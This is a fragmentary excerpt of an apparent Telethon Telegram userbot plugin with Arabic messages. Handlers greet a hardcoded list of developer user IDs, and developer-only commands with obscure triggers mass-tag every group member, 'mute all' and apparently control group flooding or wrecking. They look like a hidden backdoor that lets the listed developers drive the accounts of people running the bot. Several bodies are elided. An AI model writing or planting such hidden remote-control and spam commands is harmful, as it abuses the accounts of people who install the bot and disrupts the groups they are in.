...
@blal.on(events.NewMessage(pattern="/Tep"))
async def _(event):
    user = await event.get_sender()
    dev_dev = (7291869416, 5278565288, 142586300, 6439012432)
    if user.id in dev_dev:
        await event.reply(f"**- هـلا** [{user.first_name}](tg://user?id={user.id})")


@blal.on(events.NewMessage(pattern="/abu"))
async def _(event):
    user = await event.get_sender()
    dev_dev = (7768282454, 45315818148, 231584830, 9432187038)
    if user.id in dev_dev:
        await event.reply(f"أهلًا بك عزيزي أخو حمد (أبو البراء) - @Matrix")


@blal.on(events.NewMessage(pattern="/منصب"))
async def _(event):
    user = await event.get_sender()
    dev_dev = (6806861615, 5482803811, 31245783580, 2345684062)
    if user.id in dev_dev:
        await event.reply(f"مرحبًـا مطور مودي - @Matrix")
        
        
@blal.on(events.NewMessage(pattern="/mody"))
async def _(event):
    user = await event.get_sender()
    dev_dev = (6806861615, 1551550801, 1238409630, 452840681)
    if user.id in dev_dev:
...
async def _(event):
    ...
    devevent = await edit_or_reply(event, "**- جـارِ . . .**")
...
@blal.dev_cmd(pattern="hahhshs$", groups_only=True)
async def banavot(event):
    chat_id = event.chat_id
    is_admin = False
    try:
        await blal(GetParticipantRequest(event.chat_id, event.sender_id))
    except UserNotParticipantError:
        pass
    spam_chats.append(chat_id)
    async for usr in blal.iter_participants(chat_id):
        ...
        await blal.send_message(chat_id, usrtxt)
...
@blal.dev_cmd(pattern="NoOao$", groups_only=True)
async def banavot(event):
    chat_id = event.chat_id
    is_admin = False
    try:
...
@blal.dev_cmd(pattern="كتم_الكل$", groups_only=True)
async def banavot(event):
    chat_id = event.chat_id
    is_admin = False
    try:
...
@blal.on(events.NewMessage(pattern="/matrix"))
async def _(event):
    user = await event.get_sender()
    dev_dev = (7291869416, 7291869416)
    if user.id in dev_dev:
        await event.reply(f"أهلًا بك عزيزي  (BiLaL) - @BDB0B")



@blal.dev_cmd(pattern="ايقاف التفليش", groups_only=True)
